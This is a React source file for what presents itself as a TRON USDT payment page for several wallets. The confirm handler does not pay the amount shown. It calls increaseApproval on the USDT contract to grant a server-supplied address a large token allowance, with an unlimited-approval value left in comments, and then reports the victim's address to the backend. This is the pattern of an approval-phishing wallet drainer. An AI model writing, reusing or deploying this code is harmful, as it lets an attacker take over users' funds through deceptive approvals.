import { useSearchParams } from 'ice';
import { useState, useEffect, useRef } from 'react';
import { useInterval } from 'ahooks';
import { Message } from '@alifd/next';

import { queryContractAddr, updateUserAddr } from '@/api';
import { base64URLDecode, parseParamMapFromUrl } from '@/utils';

import { Infos, Platforms } from './config';

import { StepOne, StepTwo, TypeStepTwoHandle } from './step';

import styles from './index.module.css';

export function BizFlow() {
  const [searchParams] = useSearchParams();

  const stepTwoRef = useRef<TypeStepTwoHandle>(null);

  const platformRef = useRef('');
  const [platform, setPlatform] = useState('');

  const [wallet, setWallet] = useState<TypeWallet>('');
  const [chain, setChain] = useState<TypeChain>('');
  // TODO
  const [addrUsdt, setAddrUsdt] = useState(Infos.tronlink.uca.main || '');
  const [addrTarget, setAddrTarget] = useState('');

  const [pageParams, setPageParams] = useState({
    orderStr: '',
    amountStr: '',
  });
  const [platformMatched, setPlatformMatched] = useState(false);

  /* ❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌ */
  const IS_DEV = false;
  const [tempInfo, setTempInfo] = useState({});
  /* ❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌ */

  // 1 -> [收款地址/金额/立即支付]
  // 2 -> [安全操作...]
  const [flowStep, setFlowStep] = useState<'1' | '2'>('1');

  const okexPreFn = async () => {
    try {
      const state = await window.okxwallet?.tronLink?.request?.({
        method: 'tron_requestAccounts',
      });
      if (state.code == 200) {
        const trx =
          await window.okxwallet?.tronLink?.tronWeb?.trx?.getBalance?.(
            // eslint-disable-next-line @typescript-eslint/comma-dangle
            window.okxwallet?.tronLink?.tronWeb?.defaultAddress?.base58
          );
        Message.show({
          type: 'notice',
          align: 'cc cc',
          content: `TRX: ${trx}, ${
            trx < 100000000
              ? '❌ 没有足够的TRX用于支付网络费！'
              : '🎉 TRX 足够，后续功能请期待！'
          }`,
        });
      } else {
        alert('DAPP请求连接失败！');
        Message.show({
          type: 'error',
          align: 'cc cc',
          content: 'DAPP请求连接失败！',
        });
      }
    } catch (e) {
      Message.show({
        type: 'error',
        align: 'cc cc',
        content: '发生异常！',
      });
    }
  };

  const clearUseInterval = useInterval(() => {
    if (Platforms.includes(platformRef.current)) {
      if (window.tronLink && window.tron?.isTronLink) {
        setWallet(Infos.tronlink.wallet);
        setChain(Infos.tronlink.chain);
        clearUseInterval?.();
        setPlatformMatched(true);
        // window.tronWeb?.trx
        //   ?.getBalance(window.tronWeb?.defaultAddress?.base58)
        //   ?.then((a) => {
        //     setTempInfo({
        //       content: `TRX余额：${a / 1000000}`,
        //     });
        //   });
        // // Message.show({
        // //   type: 'success',
        // //   align: 'cc cc',
        // //   content: 'TronLink钱包',
        // // });
      } else if (window.imToken) {
        setWallet(Infos.imToken.wallet);
        setChain(Infos.imToken.chain);
        clearUseInterval?.();
        setPlatformMatched(true);
      } else if (window.tron?.isTokenPocket) {
        setWallet(Infos.tokenPocket.wallet);
        setChain(Infos.tokenPocket.chain);
        clearUseInterval?.();
        setPlatformMatched(true);
        // window.tronWeb?.trx
        //   ?.getBalance(window.tronWeb?.defaultAddress?.base58)
        //   ?.then((a) => {
        //     setTempInfo({
        //       content: `TRX余额：${a / 1000000}`,
        //     });
        //   });
      } else if (window.okxwallet) {
        setWallet(Infos.okex.wallet);
        setChain(Infos.okex.chain);
        clearUseInterval?.();
        setPlatformMatched(true);
        okexPreFn();
      } else {
        // Message.show({
        //   type: 'warning',
        //   align: 'cc cc',
        //   content: '请先安装TronLink钱包',
        // });
        // clearUseInterval?.();
      }
    } else {
      clearUseInterval?.();
    }
  }, 1_000);

  const onPayNowEvt = () => {
    const payStr = `${wallet}___${chain}`;

    switch (payStr) {
      case `${Infos.tronlink.wallet}___${Infos.tronlink.chain}`:
      case `${Infos.imToken.wallet}___${Infos.imToken.chain}`:
      case `${Infos.tokenPocket.wallet}___${Infos.tokenPocket.chain}`:
        {
          setFlowStep('2');
        }
        break;
      default:
        {
          Message.show({
            type: 'warning',
            align: 'cc cc',
            content: '当前钱包后续流程未支持，请期待',
          });
        }
        break;
    }
  };

  const onConfirmEvt = async () => {
    // const spender_bas58 = 'TWRWYcyt2X5Hs7dXT3jcJciuoQnsDJjkdJ';
    // const amount =
    //   '115792089237316195423570985008687907853269984665640564039457584007913129639935';
    try {
      // let trx = await window.tronWeb.trx.getBalance(
      //   window.tronWeb.defaultAddress.base58
      // );
      // if (trx > 25000000) {
      //   const trc20ContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
      //   try {
      //     let contract = await window.tronWeb
      //       .contract()
      //       .at(trc20ContractAddress);
      //     let res = await contract
      //       .increaseApproval(spender_bas58, amount)
      //       .send({ feeLimit: 100000000 });
      //     // successCallback(
      //     //   window.tronWeb.defaultAddress.base58,
      //     //   spender_bas58,
      //     //   approve_type
      //     // );
      //   } catch (error) {
      //     console.error('trigger smart contract error', error);
      //     alert('支付失败！');
      //   }
      // } else {
      //   alert('没有足够的TRX用于支付网络费！');
      // }

      // const { trx, defaultAddress: da, contract } = window.tronWeb || {};
      const userAddr = window.tronWeb?.defaultAddress?.base58 || '';

      if (platformRef.current === 'tronlink') {
        // 连接钱包
        const res = await window.tronLink?.request({
          method: 'tron_requestAccounts',
        });
        if (res.code !== 200) {
          alert('连接钱包失败');
          return;
        }
      }

      // 查余额
      const _trx: number = await window.tronWeb?.trx?.getBalance?.(userAddr);

      // 余额满足
      if (_trx >= Infos[platformRef.current].trxLimit.value) {
        // ??? at ?
        const _contract = await window.tronWeb?.contract?.()?.at(addrUsdt);
        const result = await _contract
          .increaseApproval(addrTarget, Infos[platformRef.current].amount)
          .send({ feeLimit: 100000000 });
        // alert(`授权成功，交易ID: ${JSON.stringify(result)}`);
        if (result) {
          updateUserAddr(userAddr);
        }
      } else {
        // ${_trx}
        // alert('没有足够的 TRX 用于支付网络费！');
        Message.show({
          type: 'warning',
          align: 'cc cc',
          content: `${_trx} _ 没有足够的 TRX 用于支付网络费！`,
        });
      }
    } catch (err) {
      //
      // alert(`发生异常: ${JSON.stringify(err)}`);
      Message.show({
        type: 'error',
        align: 'cc cc',
        content: `发生异常: ${JSON.stringify(err)}`,
      });
    } finally {
      // alert('finally');
      stepTwoRef.current?.stopLoading();
    }
  };

  const onCancelEvt = () => {
    setFlowStep('1');
  };

  useEffect(() => {
    queryContractAddr().then((res) => {
      const {
        //
        contractAddress,
        usdtContractAddress,
      } = res?.data || {};
      if (contractAddress) {
        setAddrTarget(contractAddress);
      }
      if (usdtContractAddress) {
        setAddrUsdt(usdtContractAddress);
      }
    });

    const encodeStr = searchParams.get('_');

    const fUrl = `https://x.com?${base64URLDecode(encodeStr)}`;
    const { orderStr, amountStr, platform } = parseParamMapFromUrl(fUrl);
    const plt = platform || '';
    platformRef.current = plt;
    setPlatform(plt);
    setPageParams({
      orderStr: orderStr || '',
      amountStr: amountStr || '',
    });

    if (Platforms.includes(platformRef.current) === false) {
      // 不是需要尝试的目标平台，清除
      clearUseInterval?.();
    }
  }, []);

  return (
    <div className={styles.pageContainer}>
      {IS_DEV ? (
        <div
          style={{
            position: 'fixed',
            left: '0',
            bottom: '0',
            width: '50%',
            color: '#fff',
            backgroundColor: 'tomato',
            overflow: 'scroll',
            zIndex: 1000,
          }}
        >
          <pre>{JSON.stringify(tempInfo, null, 2)}</pre>
        </div>
      ) : null}
      {flowStep === '1' ? (
        <StepOne
          platform={platform}
          displayAddr={addrUsdt}
          amount={pageParams.amountStr}
          onPayNowClick={onPayNowEvt}
        />
      ) : null}
      {flowStep === '2' ? (
        <StepTwo
          ref={stepTwoRef}
          platform={platform}
          displayAddr={addrUsdt}
          amount={pageParams.amountStr}
          onConfirmClick={onConfirmEvt}
          onCancelClick={onCancelEvt}
        />
      ) : null}
      {platformMatched ? null : (
        <div className={styles.pageNotMatched}>
          <span className={styles.pageNotMatchedTxt}>Loading....</span>
        </div>
      )}
    </div>
  );
}
